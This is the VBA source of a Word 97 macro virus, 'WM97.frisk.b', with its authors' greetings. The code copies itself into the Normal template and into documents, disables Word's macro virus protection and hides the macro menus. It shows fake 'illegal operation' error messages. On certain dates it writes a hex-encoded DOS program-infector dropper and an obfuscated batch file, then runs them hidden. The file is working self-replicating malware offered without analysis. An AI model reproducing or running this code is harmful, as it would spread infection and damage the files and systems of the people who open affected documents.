Attribute VB_Name = "frisk"
Sub HelpWordPerfectHelp()
MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"
Application.ScreenUpdating = False
Application.ShowVisualBasicEditor = False
Application.EnableCancelKey = wdCancelDisabled
CommandBars("tools").Controls("Macro").Delete
End Sub
Sub AutoClose()
' [WM97.frisk.b]
' by -KD- / Metaphase VX Team & NoMercyVirusTeam
' Tech used from Mr.Vic, 29/A & NoMercy special thanx
' Special greets to nUcLeii and VXU#2
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents("frisk").Export "c:\windows\frisk.dll"
Application.ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.EnableCancelKey = wdCancelDisabled
With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
End With
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("view").Controls("Toolbars").Delete
CommandBars("view").Controls("Status Bar").Delete
For Z = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(Z).Name = "frisk" Then NormInstall = True
Next Z
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(Z).Name = "frisk" Then ActivInstall = True
Next Z
If ActivInstall = True And NormInstall = False Then Set KD = NormalTemplate.VBProject _
Else If ActivInstall = False And NormInstall = True Then Set KD = ActiveDocument.VBProject
KD.VBComponents.Import ("c:\windows\frisk.dll")
On Error GoTo msg_frisk
If Day(Date) = "1" Or Day(Date) = "5" Or Day(Date) = "10" Or Day(Date) = "15" Or Day(Date) = "20" Or Day(Date) = "25" Or Day(Date) = "31" Then
Open "c:\windows\command\frisk.scr" For Output As #1
Print #1, "N FRISK2.COM"
Print #1, "E 0100 E9 00 00 B9 FF FF EB 05 B8 00 4C CD 21 E2 F7 E8"
Print #1, "E 0110 00 00 5D 81 ED 12 01 E9 D4 05 8D B6 52 01 8B FE"
Print #1, "E 0120 E8 02 00 EB 2D AC D0 C8 D0 C8 D0 C8 D0 C8 3E 32"
Print #1, "E 0130 86 51 01 F6 D0 F6 D8 3E 32 86 51 01 F6 D8 F6 D0"
Print #1, "E 0140 3E 32 86 51 01 D0 C8 D0 C8 D0 C8 D0 C8 AA E2 D5"
Print #1, "E 0150 C3 00 8D B6 79 06 BF 00 01 57 A4 A5 06 B8 24 35"
Print #1, "E 0160 CD 21 8D B6 7F 06 89 1C 46 46 8C 04 07 B8 24 25"
Print #1, "E 0170 8D 96 B0 02 CD 21 B4 1A 8D 96 C4 06 CD 21 B4 47"
Print #1, "E 0180 8D B6 83 06 32 D2 C6 04 5C 46 CD 21 B4 4E 8D 96"
Print #1, "E 0190 47 06 B9 07 00 CD 21 73 7C B4 3B 8D 96 44 06 CD"
Print #1, "E 01A0 21 73 E9 B4 2A CD 21 80 FA 1D 75 3F 3E 80 BE 60"
Print #1, "E 01B0 06 01 74 22 B4 19 CD 21 3E 88 86 C3 06 3C 02 74"
Print #1, "E 01C0 06 B4 0E B2 02 CD 21 B4 3B 8D 96 4D 06 CD 21 3E"
Print #1, "E 01D0 FE 86 60 06 73 B6 B8 00 B8 8E C0 33 FF 8D B6 26"
Print #1, "E 01E0 03 B9 1E 03 E8 CC 00 33 C0 CD 16 1E 8D B6 7F 06"
Print #1, "E 01F0 8B 14 46 46 8E 1C B8 24 25 CD 21 1F B4 0E 3E 8A"
Print #1, "E 0200 96 C3 06 CD 21 B4 3B 8D 96 83 06 CD 21 B4 1A BA"
Print #1, "E 0210 80 00 CD 21 C3 8D 96 E2 06 52 B8 01 43 33 C9 CD"
Print #1, "E 0220 21 B8 02 3D 5A CD 21 93 B8 00 57 CD 21 52 51 B4"
Print #1, "E 0230 3F 8D 96 79 06 B9 03 00 CD 21 3E 8B 86 DE 06 3E"
Print #1, "E 0240 8B 8E 7A 06 81 C1 EE 05 3B C1 74 54 3D 48 EE 77"
Print #1, "E 0250 4F 2D 03 00 3E 89 86 7D 06 E8 C1 00 B4 3E 80 C4"
Print #1, "E 0260 02 B9 03 00 8D 96 7C 06 CD 21 B8 02 42 33 C9 99"
Print #1, "E 0270 CD 21 E4 40 3E 88 86 51 01 B4 3E 80 C4 02 8D 96"
Print #1, "E 0280 03 01 B9 4F 00 CD 21 8D BE EE 06 57 8D B6 52 01"
Print #1, "E 0290 B9 9C 05 51 E8 8E FE B4 3E 80 C4 02 59 5A CD 21"
Print #1, "E 02A0 B8 01 57 59 5A CD 21 B4 3E CD 21 B4 4F E9 E5 FE"
Print #1, "E 02B0 B0 00 CF 56 57 50 53 51 52 E3 5B 8B D7 33 C0 FC"
Print #1, "E 02C0 AC 3C 20 72 05 AB E2 F8 EB 4C 3C 10 73 07 80 E4"
Print #1, "E 02D0 F0 0A E0 EB F1 3C 18 74 13 73 19 2C 10 02 C0 02"
Print #1, "E 02E0 C0 02 C0 02 C0 80 E4 8F 0A E0 EB DA 81 C2 A0 00"
Print #1, "E 02F0 8B FA EB D2 3C 1B 72 07 75 CC 80 F4 80 EB C7 3C"
Print #1, "E 0300 19 8B D9 AC 8A C8 B0 20 74 02 AC 4B 32 ED 41 F3"
Print #1, "E 0310 AB 8B CB 49 E0 AA 5A 59 5B 58 5F 5E C3 B8 00 42"
Print #1, "E 0320 33 C9 99 CD 21 C3 0E 11 C9 1A 18 CD 20 0B 46 2D"
Print #1, "E 0330 50 52 4F 54 20 61 6E 74 69 2D 61 6E 74 69 2D 76"
Print #1, "E 0340 69 72 75 73 20 70 72 6F 67 72 61 6D 20 0E 1A 13"
Print #1, "E 0350 CD BB 18 BA 20 0F 56 65 72 73 69 6F 6E 20 32 2E"
Print #1, "E 0360 30 19 21 6E 55 63 4C 65 69 69 20 53 6F 66 74 77"
Print #1, "E 0370 61 72 65 20 49 6E 74 65 72 6E 61 74 69 6F 6E 61"
Print #1, "E 0380 6C 20 0E BA 18 C8 1A 4C CD BC 18 18 18 10 19 04"
Print #1, "E 0390 11 19 03 0F 53 63 61 6E 19 04 18 10 19 1C 0E 11"
Print #1, "E 03A0 C9 1A 29 CD BB 18 10 19 1C 11 BA 20 0F 54 6F 6F"
Print #1, "E 03B0 20 62 61 64 20 79 6F 75 72 20 6E 6F 77 20 69 6E"
Print #1, "E 03C0 66 65 63 74 65 64 20 77 69 74 68 20 74 68 65 20"
Print #1, "E 03D0 66 72 69 73 6B 20 0E BA 18 10 19 04 11 19 02 0F"
Print #1, "E 03E0 4F 70 74 69 6F 6E 73 19 02 10 19 0A 0E 11 BA 20"
Print #1, "E 03F0 0F 76 69 72 75 73 2E 20 53 6F 72 72 79 2E 2C 2E"
Print #1, "E 0400 68 65 68 65 2E 2C 20 62 75 74 20 74 68 61 74 73"
Print #1, "E 0410 20 74 68 65 20 77 61 79 20 20 0E BA 18 10 19 1C"
Print #1, "E 0420 11 BA 20 0F 73 68 69 74 20 77 6F 72 6B 73 2E 20"
Print #1, "E 0430 49 66 20 79 6F 75 20 77 65 72 65 6E 27 74 20 73"
Print #1, "E 0440 74 65 61 6C 69 6E 67 20 73 6F 66 74 20 0E BA 18"
Print #1, "E 0450 10 19 1C 11 BA 20 0F 77 61 72 65 2C 20 6F 72 20"
Print #1, "E 0460 74 72 79 69 6E 67 20 74 6F 20 67 65 74 20 70 30"
Print #1, "E 0470 72 6E 20 6F 72 20 73 6F 6D 65 74 68 69 6E 67 2C"
Print #1, "E 0480 0E BA 18 10 19 04 16 20 0F 49 6E 66 6F 6D 61 74"
Print #1, "E 0490 69 6F 6E 20 20 10 19 0A 0E 11 BA 20 0F 74 68 65"
Print #1, "E 04A0 6E 20 74 68 69 73 20 6D 69 67 68 74 20 6E 6F 74"
Print #1, "E 04B0 20 6F 66 20 68 61 70 70 65 6E 65 64 2E 19 08 0E"
Print #1, "E 04C0 BA 18 10 19 1C 11 BA 20 0F 44 6F 6E 27 74 20 62"
Print #1, "E 04D0 75 79 20 70 72 6F 64 75 63 74 73 20 74 68 61 74"
Print #1, "E 04E0 20 68 61 72 61 73 73 20 74 68 65 69 72 20 75 73"
Print #1, "E 04F0 65 72 0E BA 18 10 19 1C 11 BA 20 0F 53 74 61 79"
Print #1, "E 0500 20 61 77 61 79 20 66 72 6F 6D 20 74 68 69 6E 67"
Print #1, "E 0510 73 20 6C 69 6B 65 20 4D 63 41 66 65 65 2C 20 4E"
Print #1, "E 0520 6F 72 74 6F 6E 0E BA 18 10 19 04 11 19 03 0F 51"
Print #1, "E 0530 75 69 74 19 04 10 19 0A 0E 11 BA 20 0F 61 6E 64"
Print #1, "E 0540 20 49 6E 76 69 72 63 69 62 6C 65 2E 2E 2C 2E 2C"
Print #1, "E 0550 19 15 0E BA 18 10 19 1C 11 BA 20 0F 47 72 65 65"
Print #1, "E 0560 74 69 6E 67 73 20 74 6F 20 66 72 69 64 72 69 6B"
Print #1, "E 0570 20 61 6E 64 20 66 72 69 73 6B 20 73 6F 66 74 77"
Print #1, "E 0580 61 72 65 2E 20 0E BA 18 10 19 1C 11 C8 1A 29 CD"
Print #1, "E 0590 BC 18 18 18 C9 1A 4C CD BB 18 BA 0F 49 6E 66 6F"
Print #1, "E 05A0 72 6D 61 74 69 6F 6E 20 61 62 6F 75 74 20 61 6E"
Print #1, "E 05B0 74 69 76 69 72 75 73 20 73 63 61 6E 6E 65 72 73"
Print #1, "E 05C0 2C 20 61 6E 64 20 68 6F 77 20 6D 6F 73 74 20 61"
Print #1, "E 05D0 72 65 20 6A 75 73 74 20 63 72 61 70 20 6E 6F 74"
Print #1, "E 05E0 20 77 6F 72 74 68 19 02 0E BA 18 BA 0F 77 61 73"
Print #1, "E 05F0 74 69 6E 67 20 79 6F 75 72 20 6D 6F 6E 65 79 20"
Print #1, "E 0600 6F 6E 2E 20 48 6F 70 65 20 74 68 69 73 20 69 73"
Print #1, "E 0610 20 22 1B 6E 69 74 1B 2D 1B 77 69 74 74 79 1B 22"
Print #1, "E 0620 20 65 6E 6F 75 67 68 20 66 6F 72 20 79 61 20 66"
Print #1, "E 0630 72 69 73 6B 21 21 21 19 06 0E BA 18 C8 1A 4C CD"
Print #1, "E 0640 BC 18 18 18 2E 2E 00 2A 2E 63 6F 6D 00 43 3A 5C"
Print #1, "E 0650 77 69 6E 64 6F 77 73 5C 63 6F 6D 6D 61 6E 64 00"
Print #1, "E 0660 00 66 72 69 73 6B 32 20 62 79 20 6E 55 63 4C 65"
Print #1, "E 0670 69 69 20 60 39 38 0A 0D 24 CD 20 00 E9 00 00 00"
Print #1, "E 0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 06A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 06B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 06C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 06D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 06E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 8D BE"
Print #1, "E 06F0 17 01 8D B6 FB 06 A5 A4 E9 57 FA B9 9C 05"
Print #1, "RCX"
Print #1, "05FE"
Print #1, "W"
Print #1, "Q"
Close #1
a$ = Chr(64) + Chr(101) + Chr(99) + Chr(104) + Chr(111) + Chr(32) + Chr(111) + Chr(102) + Chr(102)
b$ = Chr(97) + Chr(116) + Chr(116) + Chr(114) + Chr(105) + Chr(98) + Chr(32) + Chr(102) + Chr(114) + Chr(105) + Chr(115) + Chr(107) + Chr(46) + Chr(42) + Chr(32) + Chr(43) + Chr(104)
c$ = "Frisk2.com"
Open "c:\windows\command\frisk1.bat" For Output As #1
Print #1, a$
Print #1, "debug < frisk2.scr > nul"
Print #16, "copy /y frisk2.com c:\windows\command\frisk2.com >nul"
Print #1, a$
Print #1, c$
Print #1, a$
Print #1, b$
Close #1
Shell "c:\windows\command\frisk1.bat", vbHide
SetAttr "c:\windows\command\firsk1.bat", vbHidden 
End If
msg_frisk:
On Error GoTo exit_frisk
If Day(Date) = "31" Then
  Assistant.Visible = True
  With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "by -KD- 1998" & Chr$(13) & "" & "Greets to VUX#2" & Chr$(13) & "" & Chr$(13) & "Metaphase VX Team" & Chr$(13) & "" & "   -KD-" & Chr$(13) & "" & "   Sinixstar" & Chr$(13) & "" & "   Sblip" & Chr$(13) & "" & "   nUcLeii"
    .Heading = Chr(34) + Chr(87) + Chr(77) + Chr(57) + Chr(55) + Chr(46) + Chr(70) + Chr(114) + Chr(105) + Chr(115) + Chr(107) + Chr(46) + Chr(97) + Chr(34)
    .Animation = msoAnimationGetTechy
    .Show
  End With
End If
exit_frisk:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
SetAttr ("c:\windows\frisk.dll"), vbHidden + vbSystem
End Sub